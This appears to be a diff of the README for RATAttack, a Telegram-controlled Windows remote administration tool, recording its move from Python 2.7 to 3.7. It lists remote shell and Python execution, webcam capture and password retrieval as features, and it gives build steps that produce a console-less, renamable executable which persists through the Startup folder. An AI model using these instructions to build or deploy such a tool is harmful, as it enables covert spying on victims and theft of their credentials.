@@ -39,6 +39,7 @@ Windows Remote Administration Tool via Telegram (Python 3.7) | Originally create
 - Change wallpaper from file or url
 - Execute cmd shell
 - Take snapshots from the webcam (if attached)
+- Execute arbitrary python 3.7 on the go
 - [TODO] Browser (IE, Firefox, ~~Chrome~~) cookies retrieval
 - [TODO] Password retrieval
 - [TODO] Monitor web traffic (graphically?)
@@ -47,8 +48,6 @@ Windows Remote Administration Tool via Telegram (Python 3.7) | Originally create
 - [TODO] Capture clipboard (Text, Image)
 - [TODO] Hide desktop icons
 - [TODO] Audio compression
-
-- [Nope, it's py 3.7 now] Execute arbitrary python 2.7 on the go
 
  Thanks <a href="http://github.com/Dviros">Dviros</a>:
 - Chrome login/password retrieval 
@@ -71,8 +70,8 @@ Windows Remote Administration Tool via Telegram (Python 3.7) | Originally create
 - Copy this token and replace it in the beginning of the script.
 - Install the dependencies: `pip install -r requirements.txt`.
 - Install pyHook `64-bit` or `32-bit` depending on your system.
-    - For 64-bit- `pip install pyHook-1.5.1-cp27-cp27m-win_amd64.whl`.
-    - For 32-bit- `pip install pyHook-1.5.1-cp27-cp27m-win32.whl`.
+    - For 64-bit- `pip install pyHook-1.5.1-cp37-cp37m-win_amd64.whl`.
+    - For 32-bit- `pip install pyHook-1.5.1-cp37-cp37m-win32.whl`.
 - To run the script: `python RATAttack.py`.
 - Find your bot on telegram and send some command to the bot to test it.
 - To restrict the bot so that it responds only to you, note down your `chat_id` from the console and replace it in the script and comment out the line `return True`. Don't worry, you'll know when you read the comments in the script.
@@ -129,8 +128,8 @@ You can copy the above to update your command list via `BotFather` so you don't 
 	Replace your path in compileAndRun.bat (running this will actually run the executable)
 #### Or:
 	Run `pyinstaller --onefile --noconsole C:\path\to\RATAttack.py`. You can also pass `--icon=<path\to\icon.ico>` to use any custom icon.
-- Once it is compiled successfully, find the `.exe` file in `C:\Python27\Scripts\dist\`. You can change the name of the `.exe` to anything you wish.
-- **BEWARE!** If you run the compiled `.exe`, the script will hide itself and infect your PC to run at startup. You can return to normal by using the `/self_destruct` option or manually removing `C:\Users\Username\AppData\Roaming\Portal` directory and `C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\portal.lnk` (although I recommend removing them manually for the time being).
+- Once it is compiled successfully, find the `.exe` file in `C:\Python37\Scripts\dist\`. You can change the name of the `.exe` to anything you wish.
+- **BEWARE!** If you run the compiled `.exe`, the script will move itself to startup and start with your PC to run at startup. You can return to normal by using the `/self_destruct` option or manually removing `C:\Users\Username\AppData\Roaming\Portal` directory and `C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\portal.lnk` (although I recommend removing them manually for the time being).
 
 ### Modifying Settings:
 
@@ -139,8 +138,8 @@ You can copy the above to update your command list via `BotFather` so you don't 
 
 ## Notes:
 
-- Currently only Python2 is supported. Python3 support will be added soon!
-
+- ~~Currently only Python2 is supported. Python3 support will be added soon!~~ Thanks to <a href="http://github.com/dudeisbrendan03">dudeisbrendan03</a> we are on Python 3.7!
+ 
 ## Contributing:
 
 - This project is still in very early stages, so you can expect some bugs. Please feel free to report them! Even better, send a pull request :)
